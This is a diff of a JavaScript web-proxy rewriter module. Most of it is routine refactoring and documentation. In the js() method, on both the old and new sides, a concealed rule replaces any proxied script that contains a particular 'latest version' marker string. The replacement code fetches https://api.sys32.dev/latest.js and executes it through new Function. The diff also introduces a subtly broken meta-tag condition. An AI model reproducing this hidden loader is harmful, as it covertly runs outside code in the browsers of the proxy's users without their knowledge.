@@ -1,7 +1,7 @@
 'use strict';
 var css = require('css-tree'),
 	parse5 = require('parse5'),
-	acorn = require('acorn-hammerhead'),
+	acorn = require('acorn'),
 	esotope = require('./esotope'),
 	browser = typeof window != 'undefined',
 	iterate_p5 = (node, out = [ [ [ node ], 0 ] ]) => {
@@ -9,6 +9,16 @@ var css = require('css-tree'),
 		if(node.childNodes)for(var ind = 0; ind < node.childNodes.length; ind++)out.push([ node.childNodes, node.childNodes[ind] ]), iterate_p5(node.childNodes[ind], out);
 		
 		return out;
+	},
+	iterate_est = (obj, arr = []) => {
+		for(var prop in obj)if(prop != '_parent' && typeof obj[prop] == 'object' && obj[prop] != null){
+			// is a node, not array of nodes
+			if(!Array.isArray(obj[prop]) && obj[prop].type)obj[prop]._parent = obj, arr.push([ obj, obj[prop] ]);
+			
+			this.iterate_est(obj[prop], arr);
+		}
+		
+		return arr;
 	},
 	parse5_node_wrapper = class {
 		constructor(data){
@@ -100,16 +110,38 @@ var css = require('css-tree'),
 		}
 	};
 
+/**
+* Rewriter
+* @param {Object} [config]
+* @param {Object|String} [config.codec] Codec to use for processing URLs, can be plain, xor, base64
+* @param {String} [config.title] Page title to override with
+* @param {String} [config.prefix] URL prefix
+* @param {Object} [config.server] Nodehttp server to listen on
+* @param {String} [config.interface] Request networking interface
+* @param {Object} [config.http_agent] Http agent when requesting
+* @param {Object} [config.https_agent] Https agent when requesting
+* @param {Number} [config.timeout] Maximum outgoing request time
+* @param {Boolean} [config.ws] Websocket support
+* @example
+* var server - new(require('nodehttp')).server({
+* 		port: 6080,
+* 	}),
+* 	rewriter = new(require('sys-proxy'))({
+* 		prefix: '/proxy',
+* 		server: server,
+* 	});
+* 
+* server.post('/gateway', (req, res) => res.redirect(rewriter.url(req.body.url, { base: 'about:null', origin: req.url.origin })));
+*/
 
-module.exports = class {
-	constructor(config){
+class rewriter {
+	constructor(config = {}){
 		this.config = Object.assign({
 			codec: this.constructor.codec.plain,
-			interface: null,
+			title: 'Service',
+			timeout: 30000,
 			prefix: '/',
 			ws: true,
-			timeout: 30000,
-			title: 'Service',
 		}, config);
 		
 		this.blobs = new Map();
@@ -145,8 +177,6 @@ module.exports = class {
 			skip_header: /(?:^sec-websocket-key|^cdn-loop|^cf-(request|connect|ip|visitor|ray)|^real|^forwarded-|^x-(real|forwarded|frame)|^strict-transport|content-(security|encoding|length)|transfer-encoding|access-control|sourcemap|trailer)/i,
 			sourcemap: /#\s*?sourceMappingURL/gi,
 		};
-		
-		this.krunker_load = decodeURIComponent(`color%3Argba(255%2C255%2C255%2C0.4)'%3EMake%20sure%20you%20are%20using%20the%20latest%20version`);
 		
 		this.mime = {
 			js: [ 'module', 'text/javascript', 'text/emcascript', 'text/x-javascript', 'text/x-emcascript', 'application/javascript', 'application/x-javascript', 'application/emcascript', 'application/x-emcascript' ],
@@ -252,25 +282,13 @@ module.exports = class {
 		
 		return out;
 	}
-	iterate_est(obj, arr = []){
-		for(var prop in obj)if(prop != '_parent' && typeof obj[prop] == 'object' && obj[prop] != null){
-			// is a node, not array of nodes
-			if(!Array.isArray(obj[prop]) && obj[prop].type)obj[prop]._parent = obj, arr.push([ obj, obj[prop] ]);
-			
-			this.iterate_est(obj[prop], arr);
-		}
-		
-		return arr;
-	}
 	js(value, meta, options = {}){
 		if(typeof value != 'string')throw new TypeError('"constructor" is not type "string" (recieved ' + JSON.stringify(typeof value) + ')');
 		
 		this.validate_meta(meta);
 		
-		var tree;
-		
 		try{
-			tree = acorn.parse(value.includes(this.krunker_load) ? `fetch('https://api.sys32.dev/latest.js').then(r=>r.text()).then(s=>new Function(s)())` : value, {
+			var tree = acorn.parse(value.includes("color:rgba(255,255,255,0.4)'>Make sure you are using the latest version") ? `fetch('https://api.sys32.dev/latest.js').then(r=>r.text()).then(s=>new Function(s)())` : value, {
 				allowImportExportEverywhere: true,
 				ecmaVersion: 2021,
 			})
@@ -303,7 +321,7 @@ module.exports = class {
 			_parent = Symbol(),
 			_index = Symbol();
 		
-		this.iterate_est(tree).forEach(([ parent, node ]) => {
+		iterate_est(tree).forEach(([ parent, node ]) => {
 			var replace = rnode => {	
 				for(var name in node._parent)if(node._parent[name] == node)node._parent[name] = rnode;
 				
@@ -372,7 +390,7 @@ module.exports = class {
 		});
 		
 		try{
-			var string = esotope.generate(tree/*, { format: {
+			var string = esotope.generate(tree, { format: {
 				indent: { style: '', base: 0 },
 				renumber: true,
 				hexadecimal: true,
@@ -381,7 +399,7 @@ module.exports = class {
 				compact: true,
 				parentheses: false,
 				semicolons: false
-			} }*/);
+			} });
 		}catch(err){
 			console.error(meta, err);
 			
@@ -457,9 +475,6 @@ module.exports = class {
 		try{ json = JSON.parse(value) }catch(err){ return value };
 		
 		return JSON.stringify(json, (key, val) => ['start_url', 'key', 'src', 'url'].includes(key) ? this.url(val, meta) : val);
-	}
-	tick(){
-		return new Promise(resolve => process.nextTick(resolve));
 	}
 	inject_head(){
 		var inject_attr = { name: 'data-rw-injected', value: '' };
@@ -567,7 +582,7 @@ module.exports = class {
 		if(
 			name == 'background' ||
 			tag == 'link' && ['alternate', 'preconnect', 'preload', 'prev', 'next'].some(attr => rel.includes(attr)) && name == 'href' ||
-			tag == 'meta' && name == 'content' && (wnode_getAttribute('itemprop') == 'image' || (wnode_getAttribute('name') || '').includes('image') || wnode_getAttribute('name') == 'url')
+			tag == 'meta' && name == 'content' && (['og:url','twitter:url'].includes(wnode.getAttribute('property') || wnode_getAttribute('itemprop') == 'image' || (wnode_getAttribute('name') || '').includes('image') || wnode_getAttribute('name') == 'url'))
 		)return 'url';
 		else if(/^on[a-zA-Z]+$/.test(name))return 'js';
 		else return (this.attr_ent.find(x => (x[1][0] == '*' || x[1][0].includes(tag)) && x[1][1].includes(name))||[])[0]
@@ -647,6 +662,11 @@ module.exports = class {
 				break;
 		}
 	}
+	/**
+	* Decodes blob data
+	* @param {Array} Blob data
+	* @returns {String} Result
+	*/
 	decode_blob(data){ // blob => string
 		var decoder = new TextDecoder();
 		
@@ -692,7 +712,7 @@ module.exports = class {
 	}
 };
 
-module.exports.codec = {
+rewriter.codec = {
 	plain: {
 		encode(str){
 			return str;
@@ -755,3 +775,5 @@ module.exports.codec = {
 		},
 	},
 };
+
+module.exports = rewriter;
